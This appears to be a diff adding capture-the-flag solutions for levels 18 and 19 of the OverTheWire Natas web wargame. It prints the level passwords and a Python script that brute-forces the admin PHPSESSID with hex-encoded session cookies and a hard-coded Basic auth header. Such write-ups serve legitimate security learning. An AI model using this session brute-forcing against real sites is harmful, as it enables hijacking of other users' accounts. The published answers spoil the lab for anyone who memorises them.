@@ -229,6 +229,46 @@ for j in range(1,33):
 print(password)
 
 ```
+level-18
+---------
+
+password : 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+solution : in this when we look through the source code and it is checking we are admin by checking our ``phpsessionid`` ,the web app will create a random number between 1,640 as phpsession id, for some id it will set the admin session variable to 1 to we have to bruteforce the sessionid of admin using a proxy like python or web,by sending requests one by one  with phpsessionid value between 1 to 640 .when we set 119 as phpsession id will get the crentials
+
+
+level-19
+
+password : eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
+solution :
+```python
+#!/usr/bin/python3
+
+import requests
+import string
+import codecs
+
+
+req=requests.Session()
+url='http://natas19.natas.labs.overthewire.org/index.php'
+auth={'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=='}
+req.headers.update(auth)
+
+
+for i in range(1,640):
+    p=str(i)+'-admin'
+    payload=bytes.hex(bytes(p,'utf-8'))
+    cookies={'PHPSESSID':payload}
+    print(cookies)
+    r=req.get(url,cookies=cookies)
+    le=len(r.text)
+    if le>1050:
+        print(r.text)
+        break
+        
+
+```
 	
 	
 	
